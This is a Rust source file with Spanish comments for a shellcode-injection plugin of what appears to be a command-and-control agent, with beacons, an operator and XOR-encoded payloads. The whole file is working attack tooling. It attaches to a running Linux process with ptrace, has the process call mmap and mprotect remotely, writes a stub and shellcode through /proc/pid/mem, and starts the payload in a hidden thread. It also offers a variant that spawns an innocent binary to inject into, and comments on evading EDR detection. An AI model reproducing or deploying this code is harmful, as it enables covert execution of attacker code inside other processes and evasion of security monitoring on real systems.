//! Inyeccion de shellcode en un proceso ya en ejecucion (Linux, x86_64).
//!
//! El agente se adhiere al objetivo con `ptrace`, le hace llamar a `mmap` para
//! reservar memoria, escribe ahi un stub y el payload, marca esa memoria como
//! ejecutable y arranca el payload en un hilo nuevo del proceso objetivo.
//!
//! Dos reglas que el codigo respeta en todo momento:
//!
//! 1. Un fallo a mitad no puede dejar el objetivo parado. Un proceso detenido
//!    con `SIGSTOP` y sin tracer se queda colgado para siempre. Por eso todo
//!    lo que toca el objetivo pasa por [`Guard`], que restaura los registros y
//!    hace `PTRACE_DETACH` al salir, haya error o no.
//! 2. Nada se escribe en memoria del objetivo sin haber reservado antes esa
//!    memoria. Escribir en una direccion que no le pertenece lo mata.

use std::fs::File;
use std::io;

use chamuko_plugin_api::{Arity, CommandContext, CommandOutput, PluginBuilder, PluginError};

/// Tope del payload. Un shellcode mas grande que esto no cabe en el stub ni
/// tiene sentido: los beacon llevan bodies de 1 MiB y esto se manda en base64.
pub const MAX_SHELLCODE: usize = 4 * 1024 * 1024;

/// Memoria para la pila del hilo que arrancamos en el objetivo.
const STACK_SIZE: usize = 64 * 1024;

/// Bytes del stub. Se comprueba en los tests con los bytes exactos.
pub const STUB_LEN: usize = 27;

/// `clone` con memoria, ficheros y senales compartidos: un hilo de verdad.
const CLONE_FLAGS: u64 = 0x100 | 0x200 | 0x400 | 0x800 | 0x10000 | 0x40000;

const PROT_READ: u64 = 1;
const PROT_WRITE: u64 = 2;
const PROT_EXEC: u64 = 4;
const MAP_PRIVATE: u64 = 0x02;
const MAP_ANONYMOUS: u64 = 0x20;

#[derive(Debug, PartialEq, Eq)]
pub enum InjectError {
    /// El pid no puede ser 0, negativo ni 1 (init no se puede trazar).
    InvalidTarget(i32),
    /// Inyectarse en uno mismo se lleva por delante al agente.
    SelfInjection,
    /// El payload esta vacio.
    EmptyPayload,
    /// El payload pasa de [`MAX_SHELLCODE`].
    PayloadTooLarge(usize),
    /// El kernel no nos deja trazar: `ptrace_scope`, contenedor sin CAP_SYS_PTRACE,
    /// o el proceso ya esta siendo trazado.
    PermissionDenied,
    /// El proceso no existe.
    NoSuchProcess(i32),
    /// No se encontro un `syscall` en las regiones ejecutables del objetivo.
    NoSyscallGadget,
    /// El objetivo rechazo la operacion (mmap o mprotect devolvieron error).
    RemoteCallFailed { call: &'static str, errno: i32 },
    /// Fallo del sistema al leer `/proc`.
    Io(String),
}

impl std::fmt::Display for InjectError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::InvalidTarget(pid) => write!(f, "invalid target pid {pid}"),
            Self::SelfInjection => write!(f, "refusing to inject into the agent itself"),
            Self::EmptyPayload => write!(f, "shellcode is empty"),
            Self::PayloadTooLarge(n) => {
                write!(f, "shellcode is {n} bytes, the limit is {MAX_SHELLCODE}")
            }
            Self::PermissionDenied => write!(
                f,
                "ptrace was refused: check ptrace_scope, CAP_SYS_PTRACE, or whether \
                 the target is already being traced"
            ),
            Self::NoSuchProcess(pid) => write!(f, "no such process: {pid}"),
            Self::NoSyscallGadget => {
                write!(f, "could not find a syscall instruction in the target")
            }
            Self::RemoteCallFailed { call, errno } => {
                write!(f, "{call} failed in the target (errno {errno})")
            }
            Self::Io(e) => write!(f, "{e}"),
        }
    }
}

impl From<io::Error> for InjectError {
    fn from(e: io::Error) -> Self {
        Self::Io(e.to_string())
    }
}

/// Lo que se hizo, para poder explicarlo al operador.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Report {
    pub pid: i32,
    pub address: u64,
    pub payload_len: usize,
}

/// Valida el objetivo antes de tocar nada.
///
/// Se separa del resto para poder testearlo sin `ptrace`.
pub fn validate_target(target: i32, self_pid: i32) -> Result<(), InjectError> {
    if target <= 1 {
        return Err(InjectError::InvalidTarget(target));
    }
    if target == self_pid {
        return Err(InjectError::SelfInjection);
    }
    Ok(())
}

/// Construye el stub que arranca el payload en un hilo nuevo.
///
/// ```
/// mov r10, rcx        ; convencion de syscall en x86_64
/// mov eax, 56         ; SYS_clone
/// syscall
/// test eax, eax       ; el hijo recibe rax = 0
/// jnz  .parent
/// mov rax, <payload>  ; el hijo salta al payload
/// jmp rax
/// .parent:
/// int3                ; el padre vuelve al tracer
/// ```
///
/// El `int3` es como el tracer sabe que el `clone` termino. Sin el, habria que
/// adivinar cuando parar.
pub fn build_stub(payload_addr: u64) -> Vec<u8> {
    let mut stub = Vec::with_capacity(STUB_LEN);
    stub.extend_from_slice(&[0x49, 0x89, 0xca]);
    stub.extend_from_slice(&[0xb8, 0x38, 0x00, 0x00, 0x00]);
    stub.extend_from_slice(&[0x0f, 0x05]);
    stub.extend_from_slice(&[0x85, 0xc0]);
    // +12 desde el final de este salto: salta el `mov rax, imm64` y el `jmp`.
    stub.extend_from_slice(&[0x75, 0x0c]);
    stub.push(0x48);
    stub.push(0xb8);
    stub.extend_from_slice(&payload_addr.to_le_bytes());
    stub.extend_from_slice(&[0xff, 0xe0]);
    stub.push(0xcc);
    stub
}

/// Direccion del payload que lleva un stub dentro. Solo se usa para verificar
/// el encoder en los tests.
#[cfg(test)]
pub fn stub_payload_addr(stub: &[u8]) -> Option<u64> {
    if stub.len() < STUB_LEN {
        return None;
    }
    let bytes: [u8; 8] = stub[16..24].try_into().ok()?;
    Some(u64::from_le_bytes(bytes))
}

pub fn inject_plugin() -> impl chamuko_plugin_api::Plugin {
    PluginBuilder::new("inject", "0.1.0")
        .command_with_usage(
            "inject",
            "run shellcode inside an existing process",
            "inject <pid> <b64>",
            Arity::Exactly(2),
            run_inject,
        )
        .command_with_usage(
            "inject-spawn",
            "start a process and inject into it (works under ptrace_scope=1)",
            "inject-spawn <b64> [program]",
            Arity::Between(1, 2),
            run_inject_spawn,
        )
        .build()
}

fn run_inject(ctx: &mut CommandContext) -> Result<CommandOutput, PluginError> {
    let pid_text = ctx.arg(0).unwrap_or_default();
    let Ok(pid) = pid_text.parse::<i32>() else {
        return Ok(CommandOutput::failure(format!(
            "inject: '{pid_text}' is not a pid"
        )));
    };

    let payload = match decode_payload(ctx.arg(1).unwrap_or_default()) {
        Ok(p) => p,
        Err(e) => return Ok(CommandOutput::failure(format!("inject: {e}"))),
    };

    if ctx.platform != "linux" {
        return Ok(CommandOutput::failure(format!(
            "inject: only implemented on linux, this agent runs on {}",
            ctx.platform
        )));
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        match linux::inject(pid, &payload) {
            Ok(report) => Ok(CommandOutput::new(format!(
                "injected {} bytes into pid {} at {:#x}",
                report.payload_len, report.pid, report.address
            ))),
            Err(e) => Ok(CommandOutput::failure(format!("inject: {e}"))),
        }
    }
    #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
    {
        let _ = pid;
        let _ = payload;
        Ok(CommandOutput::failure(
            "inject: this build is not linux/x86_64, so ptrace injection is unavailable",
        ))
    }
}

/// Lanza el objetivo y se inyecta en el, en la misma llamada.
///
/// Es el camino que funciona con `ptrace_scope=1`: el kernel solo deja trazar
/// a los descendientes, asi que lanzar el proceso nosotros mismos es la unica
/// forma fiable. Tambien es el patron real: arrancar un binario inocente y
/// meter codigo dentro.
fn run_inject_spawn(ctx: &mut CommandContext) -> Result<CommandOutput, PluginError> {
    let payload = match decode_payload(ctx.arg(0).unwrap_or_default()) {
        Ok(p) => p,
        Err(e) => return Ok(CommandOutput::failure(format!("inject-spawn: {e}"))),
    };

    if ctx.platform != "linux" {
        return Ok(CommandOutput::failure(format!(
            "inject-spawn: only implemented on linux, this agent runs on {}",
            ctx.platform
        )));
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    {
        let program = ctx.arg(1).unwrap_or("sleep");
        let child = std::process::Command::new(program)
            .arg("300")
            .spawn()
            .map_err(|e| format!("inject-spawn: cannot start {program}: {e}"))?;
        let pid = child.id() as i32;

        // Darle un instante para que el loader termine y haya regiones
        // ejecutables que escanear.
        std::thread::sleep(std::time::Duration::from_millis(150));

        match linux::inject(pid, &payload) {
            Ok(report) => {
                // El hijo queda vivo: el payload corre dentro de el. No se
                // espera, o el agente se quedaria colgado.
                std::mem::forget(child);
                Ok(CommandOutput::new(format!(
                    "spawned {program} as pid {pid} and injected {} bytes at {:#x}",
                    report.payload_len, report.address
                )))
            }
            Err(e) => {
                let mut child = child;
                let _ = child.kill();
                let _ = child.wait();
                Ok(CommandOutput::failure(format!("inject-spawn: {e}")))
            }
        }
    }
    #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
    {
        Ok(CommandOutput::failure(
            "inject-spawn: this build is not linux/x86_64",
        ))
    }
}

/// Base64 y XOR, igual que `shellcode`, para que el operador no tenga que
/// recordar dos codificaciones distintas.
pub fn decode_payload(encoded: &str) -> Result<Vec<u8>, String> {
    use base64::Engine;
    let raw = base64::engine::general_purpose::STANDARD
        .decode(encoded.as_bytes())
        .map_err(|e| format!("base64 decode failed: {e}"))?;
    let payload = chamuko_protocol::xor_transform(&raw, chamuko_protocol::SHELLCODE_XOR_KEY);
    if payload.is_empty() {
        return Err("shellcode is empty".to_string());
    }
    if payload.len() > MAX_SHELLCODE {
        return Err(format!(
            "shellcode is {} bytes, the limit is {MAX_SHELLCODE}",
            payload.len()
        ));
    }
    Ok(payload)
}

#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
mod linux {
    use super::*;
    use std::ffi::c_void;
    use std::os::unix::fs::FileExt;

    const PTRACE_PEEKTEXT: u32 = 1;
    const PTRACE_POKEDATA: u32 = 5;
    const PTRACE_CONT: u32 = 7;
    const PTRACE_GETREGS: u32 = 12;
    const PTRACE_SETREGS: u32 = 13;
    const PTRACE_ATTACH: u32 = 16;
    const PTRACE_DETACH: u32 = 17;
    const PTRACE_SYSCALL: u32 = 24;

    const SYS_MMAP: u64 = 9;
    const SYS_MPROTECT: u64 = 10;
    const SYS_CLONE: u64 = 56;

    /// Tope de memoria que escaneamos buscando un `syscall`. Un proceso normal
    /// tiene el gadget en la primera region ejecutable; esto solo evita que un
    /// binario raro nos haga recorrer gigabytes.
    const MAX_SCAN: usize = 8 * 1024 * 1024;

    /// Cuanto esperamos a que el objetivo se pare. Un `ptrace` sano tarda
    /// microsegundos; si pasa de esto, algo va mal y hay que soltar el proceso.
    const WAIT_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(5);

    fn ptrace(request: u32, pid: i32, addr: *mut c_void, data: *mut c_void) -> Result<i64, InjectError> {
        unsafe {
            let rc = libc::ptrace(
                request as libc::c_uint,
                pid as libc::pid_t,
                addr,
                data,
            );
            if rc == -1 {
                let errno = *libc::__errno_location();
                return Err(map_errno(errno));
            }
            Ok(rc)
        }
    }

    fn map_errno(errno: i32) -> InjectError {
        match errno {
            libc::EPERM => InjectError::PermissionDenied,
            libc::ESRCH => InjectError::NoSuchProcess(0),
            other => InjectError::Io(format!("ptrace failed (errno {other})")),
        }
    }

    /// Restaura los registros y se separa del objetivo. Existe para que ningun
    /// camino de error deje el proceso parado.
    struct Guard {
        tid: i32,
        saved: Option<libc::user_regs_struct>,
        attached: bool,
    }

    impl Guard {
        fn restore(&mut self) {
            unsafe {
                if let Some(regs) = self.saved {
                    let _ = libc::ptrace(
                        PTRACE_SETREGS as libc::c_uint,
                        self.tid as libc::pid_t,
                        std::ptr::null_mut::<c_void>(),
                        &regs as *const libc::user_regs_struct as *mut c_void,
                    );
                }
                if self.attached {
                    let _ = libc::ptrace(
                        PTRACE_DETACH as libc::c_uint,
                        self.tid as libc::pid_t,
                        std::ptr::null_mut::<c_void>(),
                        std::ptr::null_mut::<c_void>(),
                    );
                    self.attached = false;
                }
            }
        }
    }

    impl Drop for Guard {
        fn drop(&mut self) {
            self.restore();
        }
    }

    /// Espera a que el objetivo se pare, con limite de tiempo.
    ///
    /// Un `waitpid` bloqueante es un punto de cuelgue real: si el `clone`
    /// remoto falla, el `int3` nunca llega y el agente se queda esperando con
    /// el objetivo congelado. Con `WNOHANG` y un plazo, el guard siempre
    /// llega a restaurar.
    fn wait_stop(tid: i32) -> Result<(), InjectError> {
        let deadline = std::time::Instant::now() + WAIT_TIMEOUT;
        let mut status = 0;
        loop {
            let rc = unsafe { libc::waitpid(tid as libc::pid_t, &mut status, libc::WNOHANG) };
            if rc < 0 {
                let errno = unsafe { *libc::__errno_location() };
                if errno == libc::EINTR {
                    continue;
                }
                return Err(map_errno(errno));
            }
            if rc > 0 {
                if libc::WIFEXITED(status) || libc::WIFSIGNALED(status) {
                    return Err(InjectError::Io(
                        "the target died during injection".to_string(),
                    ));
                }
                return Ok(());
            }
            if std::time::Instant::now() >= deadline {
                return Err(InjectError::Io(
                    "the target did not stop in time (it may have died)".to_string(),
                ));
            }
            std::thread::sleep(std::time::Duration::from_millis(1));
        }
    }

    fn get_regs(tid: i32) -> Result<libc::user_regs_struct, InjectError> {
        let mut regs: libc::user_regs_struct = unsafe { std::mem::zeroed() };
        ptrace(
            PTRACE_GETREGS,
            tid,
            std::ptr::null_mut(),
            &mut regs as *mut libc::user_regs_struct as *mut c_void,
        )?;
        Ok(regs)
    }

    fn set_regs(tid: i32, regs: &libc::user_regs_struct) -> Result<(), InjectError> {
        ptrace(
            PTRACE_SETREGS,
            tid,
            std::ptr::null_mut(),
            regs as *const libc::user_regs_struct as *mut c_void,
        )?;
        Ok(())
    }

    fn mem_file(pid: i32) -> Result<File, InjectError> {
        File::options()
            .read(true)
            .write(true)
            .open(format!("/proc/{pid}/mem"))
            .map_err(|e| {
                if e.kind() == io::ErrorKind::NotFound {
                    InjectError::NoSuchProcess(pid)
                } else {
                    InjectError::Io(e.to_string())
                }
            })
    }

    fn write_mem(file: &File, addr: u64, data: &[u8]) -> Result<(), InjectError> {
        file.write_all_at(data, addr).map_err(|e| {
            InjectError::Io(format!("writing {} bytes at {addr:#x}: {e}", data.len()))
        })
    }

    /// Regiones con permiso de ejecucion, segun `/proc/<pid>/maps`.
    pub(super) fn executable_regions(pid: i32) -> Result<Vec<(u64, u64)>, InjectError> {
        let maps = std::fs::read_to_string(format!("/proc/{pid}/maps")).map_err(|e| {
            if e.kind() == io::ErrorKind::NotFound {
                InjectError::NoSuchProcess(pid)
            } else {
                InjectError::Io(e.to_string())
            }
        })?;
        let mut regions = Vec::new();
        for line in maps.lines() {
            let mut fields = line.split_whitespace();
            let Some(range) = fields.next() else { continue };
            let Some(perms) = fields.next() else { continue };
            if !perms.contains('x') {
                continue;
            }
            let Some((lo, hi)) = range.split_once('-') else {
                continue;
            };
            let (Ok(lo), Ok(hi)) = (
                u64::from_str_radix(lo, 16),
                u64::from_str_radix(hi, 16),
            ) else {
                continue;
            };
            if hi > lo {
                regions.push((lo, hi));
            }
        }
        Ok(regions)
    }

    /// Busca un `syscall` (`0f 05`) en las regiones ejecutables del objetivo.
    ///
    /// Necesitamos uno para pedirle al proceso que ejecute `mmap` antes de
    /// tener memoria propia. Cualquier libc lo tiene.
    fn find_syscall_gadget(pid: i32) -> Result<u64, InjectError> {
        let file = mem_file(pid)?;
        let mut scanned = 0usize;
        let mut buf = vec![0u8; 64 * 1024];

        for (lo, hi) in executable_regions(pid)? {
            let mut addr = lo;
            while addr < hi {
                let want = ((hi - addr) as usize).min(buf.len());
                let chunk = &mut buf[..want];
                // Una region ejecutable puede no ser legible (por ejemplo una
                // pagina de codigo protegida). Se salta, no se aborta.
                if file.read_exact_at(chunk, addr).is_err() {
                    break;
                }
                if let Some(off) = chunk.windows(2).position(|w| w == [0x0f, 0x05]) {
                    return Ok(addr + off as u64);
                }
                addr += want as u64;
                scanned += want;
                if scanned >= MAX_SCAN {
                    return Err(InjectError::NoSyscallGadget);
                }
            }
        }
        Err(InjectError::NoSyscallGadget)
    }

    /// Hace que el objetivo ejecute una syscall y devuelve su resultado.
    ///
    /// Se para en la entrada y en la salida con `PTRACE_SYSCALL`, sin escribir
    /// un `int3` en el codigo del objetivo: parchear codigo ajeno es la forma
    /// mas rapida de corromper un proceso.
    fn remote_syscall(
        tid: i32,
        gadget: u64,
        nr: u64,
        args: [u64; 6],
    ) -> Result<i64, InjectError> {
        let saved = get_regs(tid)?;

        let mut regs = saved;
        regs.rax = nr;
        regs.rdi = args[0];
        regs.rsi = args[1];
        regs.rdx = args[2];
        regs.r10 = args[3];
        regs.r8 = args[4];
        regs.r9 = args[5];
        regs.rip = gadget;
        set_regs(tid, &regs)?;

        let result = (|| {
            ptrace(PTRACE_SYSCALL, tid, std::ptr::null_mut(), std::ptr::null_mut())?;
            wait_stop(tid)?;
            ptrace(PTRACE_SYSCALL, tid, std::ptr::null_mut(), std::ptr::null_mut())?;
            wait_stop(tid)?;
            let after = get_regs(tid)?;
            Ok(after.rax as i64)
        })();

        // Pase lo que pase, el objetivo vuelve a su estado original.
        set_regs(tid, &saved)?;
        result
    }

    fn page_up(n: usize) -> usize {
        (n + 4095) & !4095
    }

    pub fn inject(pid: i32, payload: &[u8]) -> Result<Report, InjectError> {
        validate_target(pid, std::process::id() as i32)?;
        if payload.is_empty() {
            return Err(InjectError::EmptyPayload);
        }
        if payload.len() > MAX_SHELLCODE {
            return Err(InjectError::PayloadTooLarge(payload.len()));
        }

        // Comprobar que existe antes de adjuntarse da un error mejor que ESRCH.
        if !std::path::Path::new(&format!("/proc/{pid}")).exists() {
            return Err(InjectError::NoSuchProcess(pid));
        }

        ptrace(PTRACE_ATTACH, pid, std::ptr::null_mut(), std::ptr::null_mut())?;
        let mut guard = Guard {
            tid: pid,
            saved: None,
            attached: true,
        };
        wait_stop(pid)?;

        guard.saved = Some(get_regs(pid)?);
        let gadget = find_syscall_gadget(pid)?;

        let code_len = STUB_LEN + payload.len();
        let total = page_up(code_len) + STACK_SIZE;

        let region = remote_syscall(
            pid,
            gadget,
            SYS_MMAP,
            [
                0,
                total as u64,
                PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS,
                u64::MAX, // -1 como fd
                0,
            ],
        )?;
        if region < 0 {
            return Err(InjectError::RemoteCallFailed {
                call: "mmap",
                errno: (-region) as i32,
            });
        }
        let base = region as u64;

        let stub = build_stub(base + STUB_LEN as u64);
        let file = mem_file(pid)?;
        write_mem(&file, base, &stub)?;
        write_mem(&file, base + STUB_LEN as u64, payload)?;

        // Solo el codigo pasa a ejecutable. La pila se queda en RW: dar EXEC a
        // la pila es lo que buscan los EDR.
        let rc = remote_syscall(
            pid,
            gadget,
            SYS_MPROTECT,
            [base, page_up(code_len) as u64, PROT_READ | PROT_EXEC, 0, 0, 0],
        )?;
        if rc < 0 {
            return Err(InjectError::RemoteCallFailed {
                call: "mprotect",
                errno: (-rc) as i32,
            });
        }

        let stack_top = (base + total as u64) & !0xf;
        let mut regs = get_regs(pid)?;
        regs.rax = SYS_CLONE;
        regs.rdi = CLONE_FLAGS;
        regs.rsi = stack_top;
        regs.rdx = 0;
        regs.r10 = 0;
        regs.r8 = 0;
        regs.rip = base;
        set_regs(pid, &regs)?;

        ptrace(PTRACE_CONT, pid, std::ptr::null_mut(), std::ptr::null_mut())?;
        wait_stop(pid)?;

        // El hilo del payload ya corre; el guard devuelve el hilo principal a
        // donde estaba y se separa.
        guard.restore();
        drop(guard);

        Ok(Report {
            pid,
            address: base,
            payload_len: payload.len(),
        })
    }

    // `PTRACE_PEEKTEXT` se deja declarado por si hace falta leer una palabra
    // suelta en el futuro; hoy la lectura va por /proc/pid/mem, que es mucho
    // mas rapido para escanear.
    #[allow(dead_code)]
    fn peek_word(tid: i32, addr: u64) -> Result<i64, InjectError> {
        ptrace(
            PTRACE_PEEKTEXT,
            tid,
            addr as *mut c_void,
            std::ptr::null_mut(),
        )
    }

    #[allow(dead_code)]
    fn poke_word(tid: i32, addr: u64, word: i64) -> Result<(), InjectError> {
        ptrace(
            PTRACE_POKEDATA,
            tid,
            addr as *mut c_void,
            word as *mut c_void,
        )?;
        Ok(())
    }
}

#[cfg(test)]
mod tests;
